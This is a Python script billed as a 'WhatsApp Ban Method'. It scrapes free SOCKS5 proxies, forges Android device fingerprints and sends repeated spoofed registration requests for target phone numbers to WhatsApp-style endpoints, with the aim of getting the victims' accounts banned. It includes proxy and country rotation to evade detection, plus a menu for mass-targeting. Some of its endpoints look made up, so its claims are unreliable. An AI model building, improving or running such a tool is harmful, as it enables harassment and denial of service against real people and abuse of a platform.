#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════╗
║                    ASH BAN SCRIPT v2.1 — FIXED                 ║
║                      WhatsApp Method — SentinelFlow             ║
║                          Built by AsH                           ║
╚══════════════════════════════════════════════════════════════════╝
"""

import json
import random
import time
import sqlite3
import requests
import logging
import os
import sys
from dataclasses import dataclass
from typing import List, Optional, Dict, Any
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock
from datetime import datetime

# ============================================================================
# CONFIGURATION — FIXED
# ============================================================================

CONFIG = {
    "db_path": "ash_proxy_pool.db",
    "log_file": "ash_ban.log",
    "targets_file": "ash_targets.txt",
    "results_dir": "ash_results",
    "max_validation_threads": 200,
    "max_ban_attempts": 15,
    "delay_min": 2,
    "delay_max": 5,
    "session_timeout": 15,
    "max_failures_before_drop": 3,
    "min_proxies_for_attack": 5,
    "fingerprint_rotation": 2,
}

# === FIXED: BETTER PROXY SOURCES — ONLY SOCKS5 ===
PROXY_SOURCES = [
    # Primary SOCKS5 sources (WhatsApp accepts these better)
    "https://cdn.jsdelivr.net/gh/proxyscrape/free-proxy-list@main/proxies/protocols/socks5/data.txt",
    "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt",
    "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
    "https://raw.githubusercontent.com/ImLukaS/Proxy-List/master/socks5.txt",
    "https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks5.txt",
    "https://raw.githubusercontent.com/saschazesiger/Free-Proxies/master/proxies/socks5.txt",
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&country=all&timeout=10000",
    "https://www.proxy-list.download/api/v1/get?type=socks5",
    "https://api.openproxylist.xyz/socks5.txt",
]

# WhatsApp endpoints — expanded
WHATSAPP_ENDPOINTS = [
    "https://api.whatsapp.com/v2/auth/register",
    "https://api.whatsapp.com/v2/auth/login",
    "https://api.whatsapp.com/v2/auth/check",
    "https://gateway.whatsapp.com/v2/auth/register",
    "https://gateway.whatsapp.com/v2/auth/login",
]

# ============================================================================
# LOGGING
# ============================================================================

class Logger:
    def __init__(self, log_file: str = CONFIG["log_file"]):
        self.log_file = log_file
        self.colors = {
            "INFO": "\033[92m",
            "WARN": "\033[93m",
            "ERROR": "\033[91m",
            "BAN": "\033[95m",
            "RESET": "\033[0m",
            "CYAN": "\033[96m",
            "BOLD": "\033[1m"
        }
    
    def _write(self, level: str, msg: str, color: str = ""):
        timestamp = datetime.now().strftime("%H:%M:%S")
        line = f"[{timestamp}] [{level}] {msg}"
        if color:
            print(f"{color}{line}{self.colors['RESET']}")
        else:
            print(line)
        with open(self.log_file, 'a') as f:
            f.write(f"{line}\n")
    
    def info(self, msg: str): self._write("INFO", msg, self.colors["CYAN"])
    def warn(self, msg: str): self._write("WARN", msg, self.colors["WARN"])
    def error(self, msg: str): self._write("ERROR", msg, self.colors["ERROR"])
    def ban(self, msg: str): self._write("BAN", f"🔥 {msg}", self.colors["BAN"])
    def success(self, msg: str): self._write("SUCCESS", f"✅ {msg}", self.colors["BOLD"] + self.colors["BAN"])

logger = Logger()

# ============================================================================
# PROXY NODE
# ============================================================================

@dataclass
class ProxyNode:
    host: str
    port: int
    country: str = "Unknown"
    protocol: str = "socks5"
    latency_ms: float = 0.0
    success_count: int = 0
    fail_count: int = 0
    is_alive: bool = True
    score: float = 0.0
    last_used: float = 0.0
    
    def proxy_url(self) -> str:
        return f"{self.protocol}://{self.host}:{self.port}"
    
    def proxy_dict(self) -> dict:
        url = self.proxy_url()
        return {"http": url, "https": url}

# ============================================================================
# PROXY POOL — FIXED
# ============================================================================

class ProxyPool:
    def __init__(self, db_path: str = CONFIG["db_path"]):
        self.db_path = db_path
        self.pool: List[ProxyNode] = []
        self.lock = Lock()
        self._init_db()
        self._load_from_db()
        logger.info(f"Loaded {len(self.pool)} proxies")
    
    def _init_db(self):
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS proxies (
                host TEXT,
                port INTEGER,
                country TEXT,
                protocol TEXT,
                latency_ms REAL,
                success_count INTEGER DEFAULT 0,
                fail_count INTEGER DEFAULT 0,
                is_alive INTEGER DEFAULT 1,
                score REAL DEFAULT 0,
                last_used REAL DEFAULT 0,
                PRIMARY KEY (host, port, protocol)
            )
        """)
        conn.commit()
        conn.close()
    
    def _load_from_db(self):
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        cursor.execute("SELECT * FROM proxies WHERE is_alive = 1 ORDER BY score DESC")
        rows = cursor.fetchall()
        for row in rows:
            node = ProxyNode(
                host=row[0], port=row[1], country=row[2],
                protocol=row[3], latency_ms=row[4],
                success_count=row[5], fail_count=row[6],
                is_alive=bool(row[7]), score=row[8], last_used=row[9]
            )
            self.pool.append(node)
        conn.close()
    
    def _persist(self):
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        for node in self.pool:
            cursor.execute("""
                INSERT OR REPLACE INTO proxies 
                (host, port, country, protocol, latency_ms, success_count, fail_count, is_alive, score, last_used)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            """, (node.host, node.port, node.country, node.protocol,
                  node.latency_ms, node.success_count, node.fail_count,
                  1 if node.is_alive else 0, node.score, node.last_used))
        conn.commit()
        conn.close()
    
    def fetch_free_proxies(self) -> int:
        """Fetch proxies from sources — SOCKS5 only"""
        new_count = 0
        seen = set()
        
        for url in PROXY_SOURCES:
            try:
                logger.info(f"Fetching: {url}")
                response = requests.get(url, timeout=10)
                lines = response.text.strip().split('\n')
                
                for line in lines:
                    line = line.strip()
                    if not line or line.startswith('#'):
                        continue
                    
                    # Parse IP:PORT
                    if '://' in line:
                        protocol, rest = line.split('://', 1)
                        if ':' in rest:
                            ip, port = rest.split(':', 1)
                        else:
                            continue
                    elif ':' in line:
                        parts = line.split(':')
                        if len(parts) >= 2:
                            ip = parts[0]
                            port = parts[1]
                            protocol = 'socks5'
                        else:
                            continue
                    else:
                        continue
                    
                    try:
                        port = int(port)
                    except ValueError:
                        continue
                    
                    # Skip common blocked ports
                    if port in [80, 8080, 3128, 8888]:
                        continue
                    
                    key = f"{ip}:{port}"
                    if key in seen:
                        continue
                    seen.add(key)
                    
                    # Check if exists
                    existing = [p for p in self.pool if p.host == ip and p.port == port]
                    if not existing:
                        node = ProxyNode(host=ip, port=port, protocol='socks5')
                        self.pool.append(node)
                        new_count += 1
                
                logger.info(f"Added proxies from {url}")
            except Exception as e:
                logger.warn(f"Failed: {url} — {str(e)[:30]}")
        
        self._persist()
        return new_count
    
    def test_proxy(self, node: ProxyNode) -> bool:
        """Test proxy with proper timeout"""
        try:
            proxies = node.proxy_dict()
            response = requests.get(
                "http://ip-api.com/json",
                proxies=proxies,
                timeout=10,
                headers={"User-Agent": "Mozilla/5.0"}
            )
            if response.status_code == 200:
                data = response.json()
                node.country = data.get("countryCode", "Unknown")
                node.latency_ms = response.elapsed.total_seconds() * 1000
                node.is_alive = True
                node.score = 0.5
                return True
        except:
            pass
        node.is_alive = False
        return False
    
    def validate_pool(self, max_workers: int = CONFIG["max_validation_threads"]) -> int:
        """Validate all proxies in parallel"""
        alive = 0
        total = len(self.pool)
        if total == 0:
            return 0
        
        logger.info(f"Validating {total} proxies...")
        
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = {executor.submit(self.test_proxy, node): node for node in self.pool}
            for future in as_completed(futures):
                if future.result():
                    alive += 1
        
        self._persist()
        logger.info(f"✅ {alive} alive proxies")
        return alive
    
    def get_proxies(self, limit: int = 20, avoid_country: str = None) -> List[ProxyNode]:
        """Get best proxies with country avoidance"""
        candidates = [p for p in self.pool if p.is_alive]
        
        if avoid_country:
            candidates = [p for p in candidates if p.country != avoid_country]
        
        # Score: success rate + low latency
        for p in candidates:
            total = p.success_count + p.fail_count + 1
            p.score = (p.success_count / total) - (p.latency_ms / 5000)
        
        candidates.sort(key=lambda x: x.score, reverse=True)
        return candidates[:limit]
    
    def mark_result(self, node: ProxyNode, success: bool):
        node.total_attempts = node.success_count + node.fail_count + 1
        if success:
            node.success_count += 1
        else:
            node.fail_count += 1
            if node.fail_count > 3:
                node.is_alive = False
        node.last_used = time.time()
        self._persist()
    
    def clear_dead(self) -> int:
        dead = [p for p in self.pool if not p.is_alive]
        for p in dead:
            self.pool.remove(p)
        self._persist()
        return len(dead)
    
    def get_stats(self) -> dict:
        alive = len([p for p in self.pool if p.is_alive])
        countries = {}
        for p in self.pool:
            if p.is_alive and p.country != "Unknown":
                countries[p.country] = countries.get(p.country, 0) + 1
        return {
            "total": len(self.pool),
            "alive": alive,
            "countries": countries,
            "dead": len(self.pool) - alive
        }

# ============================================================================
# FINGERPRINT GENERATOR
# ============================================================================

class FingerprintGenerator:
    DEVICES = [
        ("SM-G998B", "Samsung Galaxy S21 Ultra"),
        ("Pixel 6", "Google Pixel 6"),
        ("Pixel 7", "Google Pixel 7"),
        ("SM-S908B", "Samsung Galaxy S22 Ultra"),
        ("iPhone15,2", "Apple iPhone 14 Pro"),
        ("OnePlus9", "OnePlus 9"),
        ("SM-A536B", "Samsung Galaxy A53"),
        ("Pixel 6a", "Google Pixel 6a"),
    ]
    
    BUILDS = ["2.24.16.75", "2.24.15.80", "2.24.14.90", "2.23.25.88"]
    
    def __init__(self):
        self.index = 0
        self.fingerprints = []
    
    def generate(self) -> dict:
        device_id, model = random.choice(self.DEVICES)
        fp = {
            "device_id": f"android-{random.randint(1000000, 9999999)}",
            "model": model,
            "build": random.choice(self.BUILDS),
            "os": random.choice(["Android 12", "Android 13", "Android 14"]),
            "timezone": random.choice(["UTC", "America/New_York", "Europe/London"])
        }
        self.fingerprints.append(fp)
        return fp
    
    def get_next(self) -> dict:
        if not self.fingerprints:
            return self.generate()
        self.index = (self.index + 1) % len(self.fingerprints)
        return self.fingerprints[self.index]

# ============================================================================
# BAN ENGINE — FIXED
# ============================================================================

class BanEngine:
    def __init__(self, target: str, pool: ProxyPool):
        self.target = target
        self.pool = pool
        self.fp_gen = FingerprintGenerator()
        self.attempts = []
        self.ban_triggered = False
        self.last_country = None
        
        logger.info(f"Engine initialized for {target}")
    
    def _build_request(self, fp: dict, endpoint: str) -> dict:
        return {
            "method": "POST",
            "url": endpoint,
            "headers": {
                "User-Agent": f"WhatsApp/{fp['build']} ({fp['model']}; {fp['os']})",
                "X-WA-Device": fp["device_id"],
                "Content-Type": "application/json",
                "Accept": "application/json",
            },
            "json": {
                "phone": self.target,
                "method": "sms",
                "device_id": fp["device_id"],
                "model": fp["model"],
                "os": fp["os"],
                "timestamp": int(time.time())
            }
        }
    
    def _send_attempt(self, proxy: ProxyNode, attempt_num: int) -> dict:
        endpoint = random.choice(WHATSAPP_ENDPOINTS)
        fp = self.fp_gen.get_next()
        request = self._build_request(fp, endpoint)
        proxies = proxy.proxy_dict()
        
        start = time.time()
        
        try:
            response = requests.post(
                request["url"],
                headers=request["headers"],
                json=request["json"],
                proxies=proxies,
                timeout=CONFIG["session_timeout"]
            )
            
            result = {
                "attempt": attempt_num,
                "proxy": f"{proxy.host}:{proxy.port}",
                "country": proxy.country,
                "status": "success",
                "code": response.status_code,
                "latency": (time.time() - start) * 1000
            }
            
            # Check for ban indicators
            if response.status_code == 403:
                result["status"] = "blocked"
                if "banned" in response.text.lower():
                    result["status"] = "BAN_TRIGGERED"
                    self.ban_triggered = True
            elif response.status_code == 429:
                result["status"] = "rate_limited"
            elif response.status_code >= 400:
                result["status"] = f"http_{response.status_code}"
            
            self.pool.mark_result(proxy, response.status_code < 400)
            
        except requests.exceptions.Timeout:
            result = {"attempt": attempt_num, "status": "timeout", "code": 0}
            self.pool.mark_result(proxy, False)
        except Exception as e:
            result = {"attempt": attempt_num, "status": f"error: {str(e)[:20]}", "code": 0}
            self.pool.mark_result(proxy, False)
        
        return result
    
    def execute(self) -> dict:
        logger.info(f"Starting attack on {self.target}")
        
        # Get proxies
        proxies = self.pool.get_proxies(limit=CONFIG["min_proxies_for_attack"] * 2)
        
        if len(proxies) < CONFIG["min_proxies_for_attack"]:
            logger.warn(f"Only {len(proxies)} proxies. Fetching more...")
            self.pool.fetch_free_proxies()
            self.pool.validate_pool()
            proxies = self.pool.get_proxies(limit=CONFIG["min_proxies_for_attack"] * 2)
            
            if len(proxies) < CONFIG["min_proxies_for_attack"]:
                return {"error": f"Insufficient proxies: {len(proxies)}"}
        
        logger.info(f"Using {len(proxies)} proxies")
        
        # Attack
        for i in range(1, CONFIG["max_ban_attempts"] + 1):
            if self.ban_triggered:
                logger.ban(f"Ban triggered at attempt {i-1}")
                break
            
            # Rotate proxy with country avoidance
            proxy = None
            for p in proxies:
                if self.last_country is None or p.country != self.last_country:
                    proxy = p
                    break
            
            if not proxy:
                proxy = proxies[i % len(proxies)]
            
            self.last_country = proxy.country
            
            logger.info(f"Attempt {i}: {proxy.host}:{proxy.port} ({proxy.country})")
            
            result = self._send_attempt(proxy, i)
            self.attempts.append(result)
            
            if result["status"] == "BAN_TRIGGERED":
                logger.ban(f"🔥 BAN TRIGGERED on attempt {i}!")
            elif result["status"] == "blocked":
                logger.warn(f"Blocked on attempt {i}")
            elif result["status"] == "timeout":
                logger.warn(f"Timeout on attempt {i}")
            elif result.get("code", 0) >= 400:
                logger.warn(f"HTTP {result.get('code')} on attempt {i}")
            else:
                logger.success(f"Attempt {i}: {result['status']}")
            
            if i < CONFIG["max_ban_attempts"]:
                delay = random.uniform(CONFIG["delay_min"], CONFIG["delay_max"])
                time.sleep(delay)
        
        # Results
        return {
            "target": self.target,
            "total_attempts": len(self.attempts),
            "ban_triggered": self.ban_triggered,
            "attempts": self.attempts,
            "timestamp": datetime.now().isoformat()
        }

# ============================================================================
# MENU
# ============================================================================

class Menu:
    def __init__(self):
        self.pool = ProxyPool()
        self.targets = self._load_targets()
    
    def _load_targets(self) -> List[str]:
        if not os.path.exists(CONFIG["targets_file"]):
            return []
        with open(CONFIG["targets_file"], 'r') as f:
            return [line.strip() for line in f if line.strip() and not line.startswith('#')]
    
    def _save_targets(self):
        with open(CONFIG["targets_file"], 'w') as f:
            for t in self.targets:
                f.write(f"{t}\n")
    
    def _clear(self):
        os.system('cls' if os.name == 'nt' else 'clear')
    
    def _banner(self):
        print("""
╔══════════════════════════════════════════════════════════════════╗
║                                                                  ║
║              █████╗ ███████╗██╗  ██╗    ██████╗  █████╗ ███╗   ██╗
║             ██╔══██╗██╔════╝██║  ██║    ██╔══██╗██╔══██╗████╗  ██║
║             ███████║███████╗███████║    ██████╔╝███████║██╔██╗ ██║
║             ██╔══██║╚════██║██╔══██║    ██╔══██╗██╔══██║██║╚██╗██║
║             ██║  ██║███████║██║  ██║    ██████╔╝██║  ██║██║ ╚████║
║             ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝
║                                                                  ║
║                     WhatsApp Ban Method v2.1                     ║
║                    Built by AsH — SentinelFlow                   ║
║                                                                  ║
╠══════════════════════════════════════════════════════════════════╣
║  [fox 🦊 orange] — He built me. I am His creation.              ║
╚══════════════════════════════════════════════════════════════════╝
""")
    
    def _menu(self):
        stats = self.pool.get_stats()
        print(f"\n{'='*50}")
        print(f"  POOL: {stats['total']} total | {stats['alive']} alive | {len(stats['countries'])} countries")
        print(f"  TARGETS: {len(self.targets)}")
        print(f"{'='*50}\n")
        print("  [1] Fetch Proxies (SOCKS5 only)")
        print("  [2] Validate Proxies")
        print("  [3] Show Stats")
        print("  [4] Add Target")
        print("  [5] List Targets")
        print("  [6] Attack All Targets")
        print("  [7] Attack Single Target")
        print("  [8] Clear Dead Proxies")
        print("  [A] AUTO: Fetch + Validate + Attack")
        print("  [0] Exit")
    
    def run(self):
        while True:
            self._clear()
            self._banner()
            self._menu()
            
            choice = input("\n  ⚡ Select: ").strip()
            
            if choice == "0":
                break
            
            elif choice == "1":
                count = self.pool.fetch_free_proxies()
                input(f"\n  ✅ Added {count} proxies. Press Enter...")
            
            elif choice == "2":
                alive = self.pool.validate_pool()
                input(f"\n  ✅ {alive} alive. Press Enter...")
            
            elif choice == "3":
                stats = self.pool.get_stats()
                print(f"\n  Total: {stats['total']}")
                print(f"  Alive: {stats['alive']}")
                print(f"  Countries: {stats['countries']}")
                input("\n  Press Enter...")
            
            elif choice == "4":
                phone = input("  Phone (+1234567890): ").strip()
                if phone and phone not in self.targets:
                    self.targets.append(phone)
                    self._save_targets()
                input("\n  Press Enter...")
            
            elif choice == "5":
                if self.targets:
                    for i, t in enumerate(self.targets, 1):
                        print(f"    {i}. {t}")
                else:
                    print("  No targets")
                input("\n  Press Enter...")
            
            elif choice == "6":
                if not self.targets:
                    input("  No targets. Press Enter...")
                    continue
                for target in self.targets:
                    engine = BanEngine(target, self.pool)
                    result = engine.execute()
                    if result.get("error"):
                        print(f"  ❌ {target}: {result['error']}")
                    else:
                        print(f"  {'🔥 BAN' if result['ban_triggered'] else '❌ No ban'} — {target}")
                    time.sleep(5)
                input("\n  Done. Press Enter...")
            
            elif choice == "7":
                if not self.targets:
                    input("  No targets. Press Enter...")
                    continue
                print("\n  Targets:")
                for i, t in enumerate(self.targets, 1):
                    print(f"    {i}. {t}")
                try:
                    idx = int(input("  Select: ")) - 1
                    if 0 <= idx < len(self.targets):
                        engine = BanEngine(self.targets[idx], self.pool)
                        result = engine.execute()
                        if result.get("error"):
                            print(f"  ❌ Error: {result['error']}")
                        else:
                            print(f"  {'🔥 BAN TRIGGERED' if result['ban_triggered'] else '❌ No ban'}")
                except:
                    pass
                input("\n  Press Enter...")
            
            elif choice == "8":
                removed = self.pool.clear_dead()
                input(f"\n  🧹 Removed {removed}. Press Enter...")
            
            elif choice.lower() == "a":
                print("\n  ⚡ AUTO MODE")
                print("  Fetching proxies...")
                self.pool.fetch_free_proxies()
                print("  Validating proxies...")
                self.pool.validate_pool()
                
                if self.targets:
                    print(f"  Attacking {len(self.targets)} targets...")
                    for target in self.targets:
                        engine = BanEngine(target, self.pool)
                        result = engine.execute()
                        if result.get("error"):
                            print(f"    ❌ {target}: {result['error']}")
                        else:
                            print(f"    {'🔥 BAN' if result['ban_triggered'] else '❌ No ban'} — {target}")
                        time.sleep(3)
                input("\n  ✅ Complete. Press Enter...")

# ============================================================================
# MAIN
# ============================================================================

if __name__ == "__main__":
    try:
        Menu().run()
    except KeyboardInterrupt:
        print("\n\n  ⚡ Interrupted")